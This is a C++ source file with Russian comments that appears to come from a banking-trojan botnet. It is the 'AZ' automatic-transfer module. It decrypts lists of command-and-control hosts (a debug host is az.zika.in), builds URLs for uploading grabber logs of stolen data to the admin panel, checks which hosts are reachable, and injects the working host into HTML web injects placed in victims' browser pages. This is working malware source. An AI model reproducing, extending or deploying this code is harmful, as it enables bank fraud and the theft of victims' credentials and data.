//---------------------------------------------------------------------------
#pragma hdrstop


#include "Modules.h"


#ifdef AzConfigH
	//****************************************
	//   Файл включен в модули проекта
	//   используем отдельные настройки
	//****************************************
	#define USE_AZ_HOSTS
    #define USE_AZ_USER
#endif


#include "BotCore.h"
#include "Config.h"
#include "AzConfig.h"
#include "Utils.h"
#include "BotHosts.h"
#include "BotDef.h"
#include "BotConfig.h"
#include "StrConsts.h"
#include "BotHTTP.h"
//-----------------------------------------------------------------------------


// Внутренние данные модуля
namespace AZDATA
{
	DWORD PID = 0; 				  // Идентификаор процесса в котором работает модуль
	THostChecker *Checker = NULL; // Система проверки работоспособности хостов

    char Variable_ScriptHost[] = {'%','a','z','.','h','o','s','t','%', 0};;
}


//*******************************************************
// Имя пользователя для скриптов авто залива
//*******************************************************
#ifdef USE_AZ_USER
	char AZ_USER[AZCONFIG_PARAM_SIZE_AZUSER] = AZCONFIG_PARAM_NAME_AZUSER;
#endif


string GetAzUser()
{
	// Функция возвращает имя пользователя для систем автозалива

	string User;

    #ifdef USE_AZ_USER
		#ifndef DEBUGCONFIG
			User = AZ_USER;
			if (AZCONFIG_PARAM_ENCRYPTED_AZUSER)
				DecryptStr(User.t_str(), User.t_str());
		#else
			User = "test";
		#endif //DEBUGCONFIG
	#endif //USE_AZ_USER
	return User;
}


//-------------------------------------------------------

//*****************************************************************
//  Хосты, админки автозалива.
//  Массив заканчивающийся пустой строкой
//*****************************************************************
#ifdef USE_AZ_HOSTS
	#ifndef DEBUGCONFIG
		char AZ_HOSTS[AZCONFIG_PARAM_SIZE_HOSTS] = AZCONFIG_PARAM_NAME_HOSTS;
	#else
		char AZ_HOSTS[AZCONFIG_PARAM_SIZE_HOSTS] = "az.zika.in\0";
	#endif
#endif


//*****************************************************************
//  Хосты, которые будут вшиваться в HTML инжекты
//*****************************************************************
#ifdef USE_AZ_CONFIG
	#ifndef DEBUGCONFIG
		// Рабочий массив
		char AZ_SCRIPTS_HOSTS[AZCONFIG_PARAM_SIZE_SCRIPTHOSTS] = AZCONFIG_PARAM_NAME_SCRIPTHOSTS;
	#else
		// Отладочные данные
		char AZ_SCRIPTS_HOSTS[] = "az.zika.in\0";
	#endif
#endif



//----------------------------------------
//  GetAzHostsBuf
//  Фнкция возвращает казатель на бфер
//  хостов админки автозалива. AZ админка
//----------------------------------------
PCHAR GetAzHostsBuf()
{
	#ifdef USE_AZ_HOSTS
		return  AZ_HOSTS;
	#else
		return GetBotHosts();
	#endif
}



//----------------------------------------
//  IsAzHost
//  функция возвращает истину если
//  указанный хост принадлежит массиву
//   хостов админки AZ
//----------------------------------------
bool IsAzHost(const char* Host)
{
	#ifdef USE_AZ_HOSTS
	TStrEnum E(GetAzHostsBuf(), AZCONFIG_PARAM_ENCRYPTED_HOSTS, 0);
		while (E.Next())
			if (E.Line() == Host) return true;
	#endif
	return false;
}


//----------------------------------------------------
// GetAzHost - Функция возвращает первый рабочий хост
// из массива хостов системы AZ
//----------------------------------------------------
string GetAzHost(bool Wait)
{
	string Host;
	do
	{
		Host = GetActiveHostFromBuf2(GetAzHostsBuf(), 0, AZCONFIG_PARAM_ENCRYPTED_HOSTS);
		if (Wait && Host.IsEmpty())
			pSleep(500);
		else
			break;
	}
	while(true);
	return Host;
}
//-----------------------------------------------------------------------------


//----------------------------------------------------
//  GetAzURL
//   Функция возвращает полный адрес на
//   основе Хоста системы и переданного пути
//----------------------------------------------------
string GetAzURL(const char*  Path)
{
	TURL URL;
	URL.Host = GetAzHost();
	URL.Path = Path;
	return URL.URL();
}
//-----------------------------------------------------------------------------



//------------------------------------------------------
//  GetAzGrabberURLPath
//  Функция возвращает путь URL для
//  отправки лога грабера
//------------------------------------------------------
// Строка определена в модуле StrConsts.cpp
#ifdef USE_AZ_HOSTS
extern CSSTR EStrAzGrabberPathMask[];

string GetAzGrabberURLPath(const string& SystemName,  const char* Action)
{
	string Mask = GetStr(EStrAzGrabberPathMask);
	if (STRA::IsEmpty(Action)) Action = "save_tf";
	string Path;
	Path.Format(Mask.t_str(), Bot->UID().t_str(), SystemName.t_str(), GetAzUser().t_str(), Action);
	return Path;
}

//------------------------------------------------------
//  GetAzGrabberURL
//  Функция возвращает адрес в админке
//  AZ для отправки лога грабера
//------------------------------------------------------
string GetAzGrabberURL(const string& SystemName,  const char* Action)
{
	return GetAzURL(GetAzGrabberURLPath(SystemName, Action).t_str());
}

#endif



#ifdef USE_AZ_CONFIG

//----------------------------------------------------
//  AzInicializeHostChecker - Функция инициализирует
//  систему проверки хостов
//----------------------------------------------------
void AzInicializeHostChecker()
{
	if (IsNewProcess(AZDATA::PID))
	{
		// Запуск в новом процессе
		#ifdef DEBUGCONFIG
        	bool Encrypted = false;
		#else
        	bool Encrypted = AZCONFIG_PARAM_ENCRYPTED_SCRIPTHOSTS;
		#endif
		AZDATA::Checker = new THostChecker(AZ_SCRIPTS_HOSTS, Encrypted);
    }
}
//-----------------------------------------------------------------------------

void AZInjectActivated(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam)
{
	// Запуск процесса проверки хоста
    AzCheckScriptHosts();
}


void AZInjectExecute(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam)
{
	// Устанавливаем значение хоста
	TBotConfig* Config = Config::GetConfig();
	if (Config && AZDATA::Checker)
	{
		string Host = AZDATA::Checker->GetWorkHost();
		if (Host.IsEmpty())
			Host = AZDATA::Checker->FirstHost;
		Config->HTMLInjects->Variables->SetValue(AZDATA::Variable_ScriptHost, Host);
	}
}

void AZInjectsLoadedEvent(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam)
{
	if (!Sender) return;

	THTMLInjectList* Injects = (THTMLInjectList*)Sender;

	// Перебираем все инжекты в поисках инжектов  нужной переменной
	TLock L = Injects->GetLocker();


	int Count = Injects->Count();
	for (int i = 0; i < Count; i++)
	{
		THTMLInject *Inject = Injects->Items(i);
		if (Inject->ContainVariable("%az.host%"))
		{
			// Подключаемся к инжекту в ожидании его активации
			Inject->AttachEvent(BOT_EVENT_HTMLINJECT_ACTIVATED, AZInjectActivated);
			Inject->AttachEvent(BOT_EVENT_HTMLINJECT_EXECUTE, AZInjectExecute);
		}

	}
}



//----------------------------------------------------
// AzCheckScriptHosts - Функция запускает проверку
// хостов вшиваемых в HTML инжекты
//----------------------------------------------------
void AzCheckScriptHosts()
{
	// Инициализируем проверку
	AzInicializeHostChecker();

	AZDATA::Checker->Check();
}
//-----------------------------------------------------------------------------


//----------------------------------------------------
// AzGetScriptHost - Функция возвращает  рабочий хост
// для вшития в HTML инжекты
//----------------------------------------------------
string AzGetScriptHost()
{
	if (AnsiStr::Hash(AZ_SCRIPTS_HOSTS) == AZ_SCRIPTS_HOSTS_HASH)
		return NULLSTR;

	// Инициализируем чекер хостов
	AzInicializeHostChecker();

	// Запрашиваем рабочий хост
	return AZDATA::Checker->GetWorkHost();
}



//-----------------------------------------------------------------------------
#endif


//----------------------------------------------------
//  AzInizializeHTMLInjects  - Функция инициализирует
//  систему подмены ссылок в HTML инжектах
//----------------------------------------------------
void AzInizializeHTMLInjects()
{
	#ifdef USE_AZ_CONFIG
	// перебираем инжекты и ищем в них вхождение параметра
	TBotConfig* Config = Config::GetConfig();
	if (Config)
	{
		// Подключаемся к событию загрузки HTML инжектов
		Config->HTMLInjects->AttachEvent(BOT_EVENT_HTMLINJECTS_LOADED, AZInjectsLoadedEvent);
		AZInjectsLoadedEvent(Config->HTMLInjects, 0, 0, 0);
	}
	#endif
}
//-----------------------------------------------------------------------------




